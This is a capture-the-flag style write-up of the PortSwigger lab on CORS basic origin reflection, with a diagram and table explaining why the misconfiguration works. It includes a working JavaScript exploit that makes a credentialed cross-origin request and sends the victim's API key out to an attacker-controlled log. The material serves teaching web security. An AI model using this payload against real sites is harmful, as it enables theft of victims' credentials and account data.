# [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)

> login the site and after the login there will be a request to the `/accountDetails`, in the response there is a header `Access-Control-Allow-Credentials: true` that indicates it might support `CORS` and it let any credentials/logs cross to any other allowed origin

- in Burp Repeater add to the request `Origin: https://example.com`
- in the response there is the header `Access-Control-Allow-Origin: https://example.com`
- this indicates that the server (where the response comes) only cares if the cookies are right, if it is then it accepts any origin, so any given `Origin: xyz` reflected in the response

> exploit ->

```
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open("get", "https://xxx.web-security-academy.net/accountDetails", true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location = "/log?key=" + this.responseText;
  }
</script>
```

- `req.withCredentials = true` tells the browser to include the victim's cookies with the cross-origin request.
- The server returns the account details and reflects `Origin: https://exploit-server.com` in `Access-Control-Allow-Origin`.
- Because that matches the requesting origin and `Allow-Credentials: true` is set, the browser lets the attacker's JavaScript read `this.responseText`, which contains the API key.
- The script then exfiltrates it by redirecting to `/log?key=`.
- CORS is enforced by the browser, not the server.

> deliver it to the victim and then view the exploit, in the logs there will be the administrator api key (in this lab the admin will receive the exploit)

```
┌─────────────────────────────────────────────┐
│  1. Victim visits attacker's exploit page   │
│     (logged into lab in another tab)        │
└──────────────────────┬──────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────┐
│  2. Script fires XHR to /accountDetails     │
│     withCredentials = true is set           │
└──────────────────────┬──────────────────────┘
                       │
          ┌────────────┴────────────┐
          ▼                         ▼
┌──────────────────────┐  ┌──────────────────────┐
│ 3a. Browser adds     │  │ 3b. Browser attaches │
│     Origin header    │  │     victim's cookies │
│                      │  │                      │
│ Origin:              │  │ Because              │
│ exploit-server.net   │  │ withCredentials=true │
└──────────┬───────────┘  └──────────┬───────────┘
           │                         │
           ▼                         ▼
┌──────────────────────┐  ┌──────────────────────┐
│ 4a. Server reflects  │  │ 4b. Server returns   │
│     the origin       │  │     secret data      │
│                      │  │                      │
│ ACAO:                │  │ Victim's API key     │
│ exploit-server.net   │  │ in response body     │
│ ACAC: true           │  │ (cookie identified)  │
└──────────┬───────────┘  └──────────┬───────────┘
           │                         │
           └────────────┬────────────┘
                        ▼
┌─────────────────────────────────────────────┐
│  5. Browser CORS check (the bottleneck)     │
│                                             │
│     Does ACAO match my origin?     YES      │
│     Is ACAC true?                  YES      │
│     → Allow JS to read response             │
└──────────────────────┬──────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────┐
│  6. responseText handed to JS               │
│     reqListener callback fires              │
└──────────────────────┬──────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────┐
│  7. location = "/log?key=" + responseText   │
│     Browser navigates to attacker's log     │
└──────────────────────┬──────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────┐
│  8. Attacker reads log                      │
│     → Victim's API key captured             │
└─────────────────────────────────────────────┘
```

**Legend:**

- `ACAO` = `Access-Control-Allow-Origin` response header
- `ACAC` = `Access-Control-Allow-Credentials` response header

---

The exploit only works because **two separate conditions** are both met:

| Key                                      | Who controls it            | What it does                                                                       |
| ---------------------------------------- | -------------------------- | ---------------------------------------------------------------------------------- |
| `withCredentials = true`                 | **Attacker** (in JS)       | Tells browser to attach victim's cookies, so response contains _their_ secret data |
| `ACAO: <attacker origin>` + `ACAC: true` | **Server** (misconfigured) | Tells browser it's OK to let attacker's JS read the response                       |

Neither alone is enough. The server's bug (origin reflection) provides one key; the attacker's `withCredentials` provides the other.
